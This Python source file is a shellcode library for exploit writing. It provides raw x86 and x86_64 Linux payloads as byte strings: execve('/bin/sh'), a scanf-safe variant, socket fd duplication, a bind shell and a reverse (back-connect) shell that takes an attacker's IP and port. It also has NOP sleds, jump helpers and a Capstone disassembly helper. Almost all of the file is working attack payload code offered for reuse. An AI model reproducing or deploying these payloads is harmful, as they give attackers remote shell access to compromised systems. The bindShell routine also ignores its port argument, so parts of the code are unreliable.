#!/usr/bin/python
from __future__ import print_function
from struct import *
from capstone import *
# a collection of shellcode use regulary on exploit code.

NOPs_X86 = '\x90'

def stoh(host):
	byte_s = ''
	if host.count('.') == 3:
		for p in host.split('.'):
			byte_s += chr(int(p))
	return byte_s

class Shellcode(str):
	mode = 0

	def __new__(cls,content,mode = 0):
		obj = super(Shellcode,cls).__new__(cls,content)
		if isinstance(mode,int):
			obj.mode = mode
		else:
			raise Exception('Invalid Mode Setting')
		return obj

	# support disassembly feature
	def disas(self):
		md = None
		if self.mode:
			md = Cs(CS_ARCH_X86, CS_MODE_64)
		else:
			md = Cs(CS_ARCH_X86, CS_MODE_32)

		if not md:
			raise Exception('Unsupported Arch')
		else:
			for (address, size, mnemonic, op_str) in md.disasm_lite(str.__str__(self), 0x1000):	
				print("0x%x:\t%s\t%s" % (address, mnemonic, op_str))

	# concentraction two Shellcode
	def __add__(self,obj):
		# if current shellcode mode was different from obj shellcode
		# it will raise exeception.

		# add 2 Shellcode
		if type(obj) is Shellcode:
			# check architecture mode
			if obj.mode == self.mode:
				return Shellcode(str.__str__(self) + obj.__str__(),self.mode)
			else:
				raise Exception('Difference Architecture Mode')
		# add Shellcode with string
		elif type(obj) is str:
			return Shellcode(str.__str__(self) + obj,self.mode)
		else:
			raise Exception('Invalid Type: obj must be a string or Shellcode')

	# def __radd__(self):
	# 	pass

	# += method
	def __iadd__(self,obj):
		# if current shellcode mode was different from obj shellcode
		# it will raise exeception.
		if type(obj) is Shellcode:
			# check mode of 2 objs, there objs must be the same
			if obj.mode == self.mode:
				self = self + obj.__str__()
				return self
			else:
				raise Exception('Difference Architecture Mode')
		elif type(obj) is str:
			self = self + obj
			return self
		else:
			raise Exception('Invalid Type: obj must be a string or Shellcode')

	def __str__(self):
		return str.__str__(self)
 
class x86:
	def dupsSock(self):
		dups = "\x31\xc9\x6a\x04\x5b\x6a\x3f\x58\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf4"
		return Shellcode(dups)

	def execveShell(self):
		execve = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
		return Shellcode(execve)

	def execveShellBypassScanf(self):
		# execve('/bin/sh') # use for scanf("%s")
		execve = "\x6a\x0f\x58\x83\xe8\x04\x99\x52\x66\x68\x2d\x70"
		execve+= "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f"
		execve+= "\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
		return Shellcode(execve)

	def dupsExecve(self):
		# reuse socket fd and execve()
		return self.dupsSock() + NOPs_X86*10 + self.execveShell()

	def bindShell(self,port):
		bindshell = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
		bindshell+= "\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
		bindshell+= "\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
		bindshell+= "\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
		bindshell+= "\x89\xe3\x31\xc9\xcd\x80"
		return Shellcode(bindshell)

	def backconnectShell(self,host,port):
		if stoh(host) == '':
			raise Exception('Invalid Host')

		if not isinstance(port,int):
			raise Exception('Invalid Port')

		backconnect = "\x68"
		backconnect+= stoh(host) #// <- IP Number "127.1.1.1"
		backconnect+= "\x5e\x66\x68"
		backconnect+= pack('>I',port)[2:]   #// <- Port Number "55555"
		backconnect+= "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
		backconnect+= "\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
		backconnect+= "\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
		backconnect+= "\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
		backconnect+= "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
		backconnect+= "\xeb\xce"
		return Shellcode(backconnect)

	def jmp(self,offset):
		offset = offset & 0xff
		return Shellcode('\xeb' + chr(offset))

class x86_64:
	def dupsSock(self):
		dups = "\x48\x31\xf6\x6a\x04\x5f\x6a\x21\x58\x0f\x05\x40\xfe\xc6\x40\x80\xfe\x03\x75\xf2"
		return Shellcode(dups,1)

	def execveShell(self):
		execve = "\xeb\x1d\x5b\x31\xc0\x67\x89\x43\x07\x67\x89\x5b\x08\x67\x89\x43\x0c"
		execve+= "\x31\xc0\xb0\x0b\x67\x8d\x4b\x08\x67\x8d\x53\x0c\xcd\x80\xe8\xde\xff"
		execve+= "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42"
		execve+= "\x42"
		return Shellcode(execve,1)

	def execveSmallShell(self):
		execve = "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
		execve+= "\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
		execve+= "\x54\x5f\x6a\x3b\x58\x0f\x05"
		return Shellcode(execve,1)

	def dupsExecve(self):
		return self.dupsSock() + NOPs_X86*10 + self.execveSmallShell()

	def jmp(self,offset):
		offset = offset & 0xff
		return Shellcode('\xeb' + chr(offset),1)